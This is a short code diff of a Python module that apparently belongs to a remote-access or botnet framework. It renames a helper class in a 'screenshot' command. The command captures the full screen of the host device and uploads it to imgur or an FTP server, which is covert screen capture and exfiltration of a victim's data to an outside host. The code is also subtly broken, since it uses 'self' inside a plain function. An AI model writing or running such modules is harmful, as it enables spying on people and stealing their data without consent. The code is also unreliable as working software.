@@ -13,7 +13,7 @@ import mss
 import util
 
 
-@Util.config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot upload=[method]')
+@util.config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot upload=[method]')
 def screenshot(args):
     """
     capture a screenshot from host device - upload methods: ftp, imgur
@@ -21,9 +21,9 @@ def screenshot(args):
     try:
         with mss.mss() as screen:
             img = screen.grab(screen.monitors[0])
-        png     = Util.png(img)
-        kwargs  = Util.kwargs(args)
-        result  = Util.imgur(png) if ('upload' not in kwargs or kwargs.get('upload') == 'imgur') else self._upload_ftp(png, filetype='.png')
+        png     = util.png(img)
+        kwargs  = util.kwargs(args)
+        result  = util.imgur(png) if ('upload' not in kwargs or kwargs.get('upload') == 'imgur') else self._upload_ftp(png, filetype='.png')
         return result
     except Exception as e:
-        Util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
+        util.debug("{} error: {}".format(self.screenshot.func_name, str(e)))
